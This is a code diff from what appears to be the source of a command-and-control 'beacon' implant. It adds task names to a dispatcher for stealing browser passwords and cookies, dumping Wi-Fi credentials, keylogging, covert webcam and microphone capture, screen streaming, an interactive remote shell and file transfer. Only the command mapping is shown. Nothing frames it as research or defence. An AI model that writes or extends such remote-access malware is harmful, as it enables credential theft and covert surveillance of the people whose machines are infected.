@@ -18,6 +18,21 @@
 namespace {
     beacon::TaskType stringToTaskType(const std::string& str) {
         if (str == "sysinfo") return beacon::TaskType::SYSINFO;
+        if (str == "installed_software") return beacon::TaskType::INSTALLED_APPS;
+        if (str == "wifi_dump") return beacon::TaskType::WIFI_DUMP;
+        if (str == "browser_pass") return beacon::TaskType::BROWSER_PASS;
+        if (str == "cookie_steal") return beacon::TaskType::COOKIE_STEAL;
+        if (str == "screenshot") return beacon::TaskType::SCREENSHOT;
+        if (str == "keylog") return beacon::TaskType::KEYLOG;
+        if (str == "webcam") return beacon::TaskType::WEBCAM;
+        if (str == "mic") return beacon::TaskType::MIC;
+        if (str == "webcam_stream") return beacon::TaskType::WEBCAM_STREAM;
+        if (str == "screen_stream") return beacon::TaskType::SCREEN_STREAM;
+        if (str == "ishell") return beacon::TaskType::ISHELL;
+        if (str == "deep_recon") return beacon::TaskType::DEEP_RECON;
+        if (str == "browse_fs") return beacon::TaskType::BROWSE_FS;
+        if (str == "file_download") return beacon::TaskType::FILE_DOWNLOAD;
+        if (str == "file_upload") return beacon::TaskType::FILE_UPLOAD;
         // Add other mappings here
         return beacon::TaskType::UNKNOWN;
     }
